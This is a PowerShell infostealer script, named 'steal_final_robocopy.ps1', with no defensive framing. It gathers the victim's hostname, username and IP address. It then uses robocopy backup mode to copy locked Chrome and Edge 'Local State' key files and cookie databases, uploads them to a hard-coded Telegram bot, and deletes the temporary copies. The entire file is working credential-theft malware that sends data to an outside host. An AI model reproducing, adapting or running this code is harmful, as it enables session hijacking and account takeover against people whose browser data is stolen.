# steal_final_robocopy.ps1
# Uses robocopy to copy locked files – works on Windows PowerShell 5.1

$t = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
$c = "6760965981"
$base = "https://api.telegram.org/bot$t"

# --- PC INFO ---
$h = $env:COMPUTERNAME
$us = $env:USERNAME
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
$body = @{ chat_id = $c; text = "PC: $h | User: $us | IP: $ip" }
Invoke-RestMethod -Uri "$base/sendMessage" -Method Post -Body $body

# --- TEMP FOLDER ---
$temp_dir = "$env:TEMP\steal_tg"
New-Item -ItemType Directory -Force -Path $temp_dir | Out-Null

# --- BROWSER PATHS ---
$browsers = @(
    @{ Name = "Edge"; LocalState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"; Cookies = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies" },
    @{ Name = "Chrome"; LocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"; Cookies = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" }
)

$sent = 0

foreach ($b in $browsers) {
    # --- Local State ---
    if (Test-Path $b.LocalState) {
        $dst = "$temp_dir\$($b.Name)_LocalState.json"
        # Use robocopy for locked files
        robocopy (Split-Path $b.LocalState) $temp_dir (Split-Path $b.LocalState -Leaf) /B /R:1 /W:1 /NFL /NDL /NJH /NJS | Out-Null
        # Rename to expected name
        if (Test-Path "$temp_dir\Local State") {
            Move-Item "$temp_dir\Local State" $dst -Force
        }
        if (Test-Path $dst) {
            $uri = "$base/sendDocument?chat_id=$c"
            try {
                Invoke-RestMethod -Uri $uri -Method Post -InFile $dst -ContentType "application/json" -ErrorAction Stop
                $sent++
            } catch {}
            Remove-Item $dst -Force -ErrorAction SilentlyContinue
        }
    }
    # --- Cookies ---
    if (Test-Path $b.Cookies) {
        $dst = "$temp_dir\$($b.Name)_Cookies.db"
        robocopy (Split-Path $b.Cookies) $temp_dir (Split-Path $b.Cookies -Leaf) /B /R:1 /W:1 /NFL /NDL /NJH /NJS | Out-Null
        if (Test-Path "$temp_dir\Cookies") {
            Move-Item "$temp_dir\Cookies" $dst -Force
        }
        if (Test-Path $dst) {
            $uri = "$base/sendDocument?chat_id=$c"
            try {
                Invoke-RestMethod -Uri $uri -Method Post -InFile $dst -ContentType "application/octet-stream" -ErrorAction Stop
                $sent++
            } catch {}
            Remove-Item $dst -Force -ErrorAction SilentlyContinue
        }
    }
}

# --- STATUS ---
$status = "Sent $sent file(s). Temp folder: $temp_dir"
$body = @{ chat_id = $c; text = $status }
Invoke-RestMethod -Uri "$base/sendMessage" -Method Post -Body $body
